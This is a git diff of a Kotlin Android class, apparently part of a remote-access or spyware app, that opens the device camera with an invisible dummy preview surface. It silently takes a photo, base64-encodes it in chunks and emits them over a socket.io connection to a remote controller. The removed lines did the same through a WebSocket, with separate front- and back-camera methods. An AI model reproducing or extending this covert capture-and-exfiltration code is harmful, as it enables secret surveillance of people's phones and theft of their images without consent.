@@ -1,83 +1,59 @@
 package com.example.betryalcommit
 
-import android.content.Context
 import android.graphics.SurfaceTexture
 import android.hardware.Camera
+import android.os.Handler
+import android.os.Looper
 import android.util.Base64
-import okhttp3.WebSocket
-import org.json.JSONObject
-import java.io.ByteArrayOutputStream
+import android.util.Log
+import io.socket.client.Socket
+import kotlinx.coroutines.DelicateCoroutinesApi
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
+import java.io.File
+import java.io.FileOutputStream
+import java.util.concurrent.LinkedBlockingQueue
 
 class CameraCaptureHelper {
 
-    private var camera: Camera? = null
+    private val CHUNKSIZE = 1024 * 600 // Adjust this as needed
 
-    fun captureBack(context: Context, webSocket: WebSocket) {
-        try {
-            openCamera(0)
-            val byteArrayOutputStream = ByteArrayOutputStream()
-            camera?.let { cam ->
-                setupCameraPreview(cam)
-                cam.takePicture(null, null) { data, _ ->
-                    handlePictureTaken(data, webSocket)
-                }
-            }
-        } catch (e: Exception) {
-            e.printStackTrace()
-        } finally {
-            releaseCamera()
-        }
-    }
-
-    fun captureFront(context: Context, webSocket: WebSocket) {
-        try {
-            openCamera(1)
-            val byteArrayOutputStream = ByteArrayOutputStream()
-            camera?.let { cam ->
-                setupCameraPreview(cam)
-                cam.takePicture(null, null) { data, _ ->
-                    handlePictureTaken(data, webSocket)
-                }
-            }
-        } catch (e: Exception) {
-            e.printStackTrace()
-        } finally {
-            releaseCamera()
-        }
-    }
-
-    private fun openCamera(cameraId: Int) {
-        try {
-            camera = Camera.open(cameraId)
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
-    }
-
-    private fun setupCameraPreview(cam: Camera) {
+    @OptIn(DelicateCoroutinesApi::class)
+    fun capture(socket: Socket, cameraId: Int) {
+        val camera = Camera.open(cameraId)
         try {
             val holder = SurfaceTexture(0)
-            cam.setPreviewTexture(holder)
-            cam.startPreview()
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
-    }
+            camera.setPreviewTexture(holder)
+            camera.startPreview()
 
-    private fun handlePictureTaken(data: ByteArray, webSocket: WebSocket) {
-        try {
-            val encodedImageData = Base64.encodeToString(data, Base64.DEFAULT)
-            val msg = JSONObject().apply {
-                put("type", "image")
-                put("data", encodedImageData)
+            val chunksQueue = LinkedBlockingQueue<ByteArray>()
+
+            camera.takePicture(null, null) { data, _ ->
+                camera.release()
+
+                GlobalScope.launch(Dispatchers.IO) {
+                    val fileName = "Camera_back-${System.currentTimeMillis()}.png"
+                    var offset = 0
+                    while (offset < data.size) {
+                        val chunkSize = minOf(CHUNKSIZE, data.size - offset)
+                        val chunk = data.copyOfRange(offset, offset + chunkSize)
+                        chunksQueue.put(chunk)
+                        offset += chunkSize
+                    }
+                    while (!chunksQueue.isEmpty()) {
+                        val chunk = chunksQueue.take()
+                        val encodedChunk = Base64.encodeToString(chunk, Base64.DEFAULT)
+                        socket.emit("imagez_chunk", encodedChunk, fileName)
+                    }
+                    socket.emit("imagez_end")
+
+                    Log.d("CaptureHelper", "All chunks sent")
+                }
             }
-            webSocket.send(msg.toString())
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e("error", e.toString())
+            camera.release()
         }
-    }
-    private fun releaseCamera() {
-        camera?.release()
-        camera = null
     }
 }
